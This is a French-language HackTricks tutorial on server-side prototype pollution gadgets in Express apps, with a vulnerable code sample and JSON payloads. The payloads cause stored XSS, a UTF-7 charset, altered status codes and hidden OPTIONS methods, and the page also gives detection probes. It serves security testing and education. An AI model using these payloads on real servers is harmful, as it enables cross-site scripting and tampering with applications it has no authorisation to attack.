# Express Prototype Pollution Gadgets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark-web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **malwares voleurs**.

Leur objectif principal avec WhiteIntel est de lutter contre les prises de contr√¥le de comptes et les attaques par ransomware r√©sultant de malwares de vol d'informations.

Vous pouvez consulter leur site web et essayer leur moteur **gratuitement** √† :

{% embed url="https://whiteintel.io" %}

***

## Serve XSS responses

**Pour plus de d√©tails** [**jetez un ≈ìil √† la recherche originale**](https://portswigger.net/research/server-side-prototype-pollution)

### Change JSON content-type to HTML

Dans une application Express utilisant un **type de contenu JSON** et refl√©tant un JSON :
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Dans ces cas, le XSS n'est normalement pas possible avec un type de contenu JSON. Cependant, avec la pollution de prototype, nous pouvons **confondre Express pour servir une r√©ponse HTML.** Cette vuln√©rabilit√© repose sur l'application utilisant **`res.send(obj)`** et utilisant le parseur de corps avec le type de contenu application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
En **polluant** les propri√©t√©s **`body`** et **`_body`**, il est possible de faire en sorte qu'**Express serve le type de contenu HTML** et refl√®te la propri√©t√© `_body`, entra√Ænant un XSS stock√©.

### Rendre UTF7

Il est possible de faire en sorte qu'Express **rende le contenu UTF-7 avec** :
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Techniques de scan s√ªres

### Espaces JSON

Le PP suivant ajoutera un espace suppl√©mentaire aux attributs √† l'int√©rieur d'un JSON, ce qui ne perturbera pas la fonctionnalit√© :
```json
{"__proto__":{"json spaces": " "}}
```
Alors, un JSON r√©fl√©chi ressemblera √† :
```json
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

Le gadget PP suivant fera en sorte que le serveur renvoie l'en-t√™te HTTP : **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Il est n√©cessaire que le **module CORS soit install√©**

### **M√©thode OPTIONS**

Avec le payload suivant, il est possible de **cacher une m√©thode d'une r√©ponse OPTIONS** :
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Statut**

Il est possible de changer le **code de statut retourn√©** en utilisant le payload PP suivant :
```json
{"__proto__":{"status":510}}
```
### Erreur

Lorsque vous assignez √† un prototype avec un primitif tel qu'une cha√Æne, cela produit une **op√©ration no-op car le prototype doit √™tre un objet**. Si vous essayez d'assigner un objet prototype √† `Object.prototype` lui-m√™me, cela **lancera une exception**. Nous pouvons utiliser ces deux comportements pour **d√©tecter si la pollution du prototype a r√©ussi** :
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valeur R√©fl√©chie

Lorsque une application inclut un objet dans sa r√©ponse, cr√©er un attribut avec un **nom inhabituel en plus de `__proto__`** peut √™tre r√©v√©lateur. Sp√©cifiquement, si **seul l'attribut inhabituel est renvoy√©** dans la r√©ponse, cela pourrait indiquer la vuln√©rabilit√© de l'application :
```json
{"unusualName":"value","__proto__":"test"}
```
De plus, dans des sc√©narios o√π une biblioth√®que comme Lodash est utilis√©e, d√©finir une propri√©t√© √† la fois via la pollution de prototype (PP) et directement √† l'int√©rieur de l'objet offre une autre approche de diagnostic. Si une telle propri√©t√© est omise de la r√©ponse, cela sugg√®re que Lodash v√©rifie l'existence de la propri√©t√© dans l'objet cible avant de fusionner :
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Divers

### Autoriser les points

Il existe une option dans Express qui vous permet de **cr√©er des objets √† partir des param√®tres de la cha√Æne de requ√™te**.\
Vous pourriez certainement l'utiliser dans une **cha√Æne** de bogues pour exploiter une **vuln√©rabilit√© de pollution de prototype**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` cr√©e un objet dans Node.**

## R√©f√©rences

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark-web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **malwares voleurs**.

Leur objectif principal avec WhiteIntel est de lutter contre les d√©tournements de compte et les attaques par ransomware r√©sultant de malwares volants d'informations.

Vous pouvez consulter leur site web et essayer leur moteur **gratuitement** √† :

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
